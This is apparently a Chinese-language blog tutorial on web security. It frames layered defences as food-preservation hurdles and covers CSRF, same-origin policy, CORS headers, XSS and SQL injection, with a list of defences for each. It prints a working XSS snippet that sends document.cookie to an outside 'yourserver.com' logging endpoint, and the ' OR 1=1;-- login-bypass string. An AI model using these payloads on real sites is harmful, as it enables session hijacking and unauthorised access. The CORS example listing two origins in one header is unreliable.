---
title: 食品柵欄技術看網頁資安
tags:
    - CSRF
    - XSS
    - Same-Origin Policy
    - SQL injection
author: Boris Chien
description:
    - 食品加工學，透過生物、物理、工程、化學層層抑菌因子，防止食物腐敗。罐頭，保值期最長的食品之一，數十道繁複的製作工序中，食品科學家巧妙地運用熱處理、pH值調整、水活性抑制，最大化保留營養價值、美味的同時，讓伺機而動的致病菌難以孳生。程式開發中，須兼顧維護、擴展、可測試、以及最重要的安全性，防止各類型資安攻擊，前端、後端、雲端、資料庫相互配合，使用最新的安全技術和漏洞掃描工具、對敏感數據進行加密、設置良好的權限控制和訪問控制、監控和記錄系統事件等等，保障系統和用戶的資安
keywords:
    - CSRF
    - XSS
    - Same-Origin Policy
    - SQL injection
categories:
    - Security
abbrlink: 19592
date: 2023-03-18 11:24:03
---

食品加工學，透過生物、物理、工程、化學層層抑菌因子，防止食物腐敗。
罐頭，保值期最長的食品之一，數十道繁複的製作工序中，食品科學家巧妙地運用熱處理、pH 值調整、水活性抑制，最大化保留營養價值、美味的同時，讓伺機而動的致病菌難以孳生。

## 資安

程式開發中，須兼顧維護、擴展、可測試、以及最重要的安全性，防止各類型資安攻擊，前端、後端、雲端、資料庫相互配合，使用最新的安全技術和漏洞掃描工具、對敏感數據進行加密、設置良好的權限控制和訪問控制、監控和記錄系統事件等等，保障系統和用戶的資安

## 攻擊類型

> -   惡意軟體
> -   網路釣魚
> -   中間人
> -   阻斷服務
> -   SQL 注入
> -   APT 攻擊（進階持續性威脅）
> -   零時差攻擊
> -   跨網站指令碼攻擊（XSS）

[Day 4 : 觀念篇 - 常見的資安攻擊類型有哪些？](https://ithelp.ithome.com.tw/articles/10293786)

## 跨站請求偽造 CSRF

簡單來說:有人偽造使用者身分去做壞事

伺服器認證，大多透過 Request 資訊判斷，無法確認來源是否為本人，這也是多因素驗證漸漸取代單一驗證原因之一。

當使用者已經登入了一個網站並開啟 session，攻擊者就可以利用 CSRF 攻擊來在使用者不知情的情況下，以使用者的名義向該網站發出各種請求，例如發送電子郵件、張貼消息、轉賬等，以達到攻擊者的目的。

攻擊者可以在網站上放置一個假的表單，這個表單的 action 指向受害者網站的某個操作，當受害者登入該網站後點擊假表單時，請求就會被發送到受害者網站，伺服器無法區分這個請求是由攻擊者還是受害者發出的，就會執行相應的操作。

## 防護

1.隨機 token，在表單提交 token 確認請求的合法性，這樣攻擊者就無法通過假表單來進行攻擊。

2.Referrer Policy，限制來自外部網站的請求，避免攻擊者通過 Referer 欄位來進行攻擊。

3.驗證機制，例如 Captcha，讓攻擊者無法自動化地提交假表單。

4.避免 GET 請求中傳遞敏感數據，將其改為 POST 請求或加密來保護數據。

5.將敏感數據保存在服務端，並通過 Session Id 或其他方式進行身份驗證。

6.Middleware，檢查和過濾 HTTP 請求。XSS，SQL 注入，跨站請求偽造，點擊劫持攻擊

## 同源策略 Same-Origin Policy

隨業務複雜化，網頁常需調用第三方服務，基於安全性，瀏覽器會限制非同源網域請求。在網站 A 的前端中發送了請求到網站 B，瀏覽器會阻止該請求並報告 CORS 錯誤。避免跨站點請求偽造 (CSRF) 或跨點腳本 (XSS)。
瀏覽器使用同源策略來防止跨域請求，只允許訪問屬於同一個源。如果需要向其他源的資源發送請求，可以使用跨域資源共享（CORS）或 JSONP 等機制來實現。

## 跨域資源共享

瀏覽器與伺服器配合，才能實現跨域請求。

### CORS

跨域資源共享是一種標準的瀏覽器機制，它使用額外的 HTTP header 來告訴瀏覽器哪些源是被允許的。當瀏覽器發送跨域請求時，伺服器可以在回應中設置相應的 CORS header，告訴瀏覽器是否允許跨域請求，允許請求方法、頭部等。在前端代碼中，可以使用 XMLHttpRequest 或 Fetch API 等方式發送跨域請求，瀏覽器會自動處理 CORS 機制。

### JSONP

一種非標準的跨域請求機制，前端動態創建 script，指定 src 屬性為跨域請求的 URL，使得瀏覽器可以向該 URL 發送 GET 請求。在伺服器端，可以將回應包裝在函數調用中，以 JSONP 的格式返回。這樣，前端代碼就可以接收到 JSONP 格式的回應，並自動解析出其中的數據。但安全性較差，容易受到跨站腳本攻擊。

### 伺服器回應
{% codeblock lang:php %}
header('Access-Control-Allow-Origin: https://example.com');
{% endcodeblock %}

白名單
{% codeblock lang:php %}
header('Access-Control-Allow-Origin: https://example.com, https://example.org');
{% endcodeblock %}

2.特定方法
{% codeblock lang:php %}
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
{% endcodeblock %}

3.特定 headers
{% codeblock lang:php %}
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept');
{% endcodeblock %}

4.禁用憑證

{% codeblock lang:php %}
header('Access-Control-Allow-Credentials: false');
{% endcodeblock %}

5.請求數量限制
{% codeblock lang:php %}
header('Access-Control-Max-Age: 3600');
{% endcodeblock %}

## XSS

> 惡意使用者將程式碼注入到網頁上，其他使用者在觀看網頁時就會受到影響。這類攻擊通常包含了 HTML 以及瀏覽器語言。

[XSS 攻擊](https://zh.wikipedia.org/zh-tw/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
{% codeblock lang:js %}

<script>
var i = new Image();
i.src = "http://yourserver.com/log.php?cookie=" + document.cookie;
</script>

{% endcodeblock %}

SRC 設置為攜帶用戶 cookie 信息的 URL。當瀏覽器加載圖像時，發送 HTTP 請求到攻擊者的服務器，夾帶受害者 cookie。攻擊者可以在伺服器記錄 cookie，用於進一步攻擊。

1.輸入驗證和過濾：在用戶輸入數據之前對其進行驗證和過濾。可以使用一些現成的庫，如 DOMPurify 和 XSS 庫來進行輸入驗證和過濾。這可以幫助防止用戶在輸入中包含惡意腳本。

2.轉義輸出：在將用戶輸入數據渲染到頁面上之前，應將其進行轉義。防止惡意腳本在頁面上執行。例如，將所有特殊字符（如<、>和&）轉換為它們的 HTML 實體編碼（如<、>和&）。

3.使用 Content Security Policy（CSP）：指定來源加載資源。使用 CSP 可以幫助防止惡意腳本的注入和執行。例如，可以設置策略，禁止加載來外源腳本或樣式表。

4.設置 HTTP-only Cookie：設置 Cookie 為 HTTP-only。防止 XSS 攻擊者在用戶瀏覽器中竊取 Cookie。

5.避免 eval()和 innerHTML：eval()函數和 innerHTML 屬性可以將字符串解釋為代碼或 HTML。容易受到 XSS 攻擊，避免使用它們，替代方法，如 textContent 和 setAttribute。

## SQL injection

> SQL 隱碼或 SQL 注碼，是發生於應用程式與資料庫層的安全漏洞。簡而言之，是在輸入的字串之中夾帶 SQL 指令，在設計不良的程式當中忽略了字元檢查，那麼這些夾帶進去的惡意指令就會被資料庫伺服器誤認為是正常的 SQL 指令而執行，因此遭到破壞或是入侵

[SQL 注入](https://zh.wikipedia.org/zh-tw/SQL%E6%B3%A8%E5%85%A5)

users 表

```
users
------------------
id | username | password
------------------
1  | Alice    | pass123
2  | Bob      | 12345
3  | Charlie  | qwerty
```

表單
{% codeblock lang:html %}

<form method="POST" action="login.php">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username">
  <br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password">
  <br>
  <input type="submit" value="Login">
</form>
{% endcodeblock %}

惡意 SQL
{% codeblock lang:sql %}
' OR 1=1;--
{% endcodeblock %}

SQL 變成
{% codeblock lang:sql %}
SELECT * FROM users WHERE username='' OR 1=1;--' AND password=''
{% endcodeblock %}

users 全部選出
{% codeblock lang:sql %}
SELECT * FROM users
{% endcodeblock %}

## 總結

前端，輸入數據進行驗證、過濾、清洗和轉義。以防止跨站腳本攻擊（XSS）。

後端，身份驗證和授權，在中介層過濾非法請求，防止未授權請求、SQL 注入等攻擊。

雲端，是防止惡意流量的關鍵。例如，Cloudflare 提供 captcha 和 DDoS 防護服務。

前端、後端、雲端多環節限制和保護，才能降低惡意攻擊可能性。
